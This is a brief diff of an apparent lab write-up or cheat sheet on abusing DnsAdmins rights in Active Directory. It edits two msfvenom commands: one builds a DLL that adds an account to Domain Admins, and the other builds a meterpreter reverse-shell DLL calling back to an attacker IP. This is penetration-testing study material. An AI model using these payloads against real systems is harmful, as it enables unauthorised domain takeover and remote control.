@@ -11,9 +11,9 @@ As detailed in this excellent [post](https://adsecurity.org/?p=4064), the follow
 ### Leveraging DnsAdmins Access
 Generate malicious DLL
 ```bash
-msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
+msfvenom -p windows/x64/exec cmd='net group "domain admins" svc-alfresco /add /domain' -f dll -o adduser.dll
 
-msfvenom -p windows/x64/reverse_tcp LHOST=10.10.15.155 LPORT=4443 -f dll -o mal.dll
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 LPORT=4443 -f dll -o mal.dll
 ```
 
 Confirm memebership
